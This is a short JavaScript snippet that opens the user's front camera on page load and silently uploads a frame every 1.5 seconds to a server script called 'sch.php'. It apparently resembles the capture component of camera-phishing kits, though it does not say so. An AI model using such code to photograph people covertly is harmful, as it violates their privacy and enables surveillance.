$(function() {
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const constraints = {
    audio: false,
    video: { facingMode: "user" }
  };

  function post(imgdata){
    $.ajax({
      url: 'sch.php',
      method: 'POST',
      dataType: 'json',
      data: { img : imgdata }
    });
  }

  function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;
    var context = canvas.getContext("2d");
    setInterval(function() {
      context.drawImage(video, 0, 0, 640, 480);
      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
      post(canvasData);
    }, 1500);
  }

  async function init() {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  }

  init();
});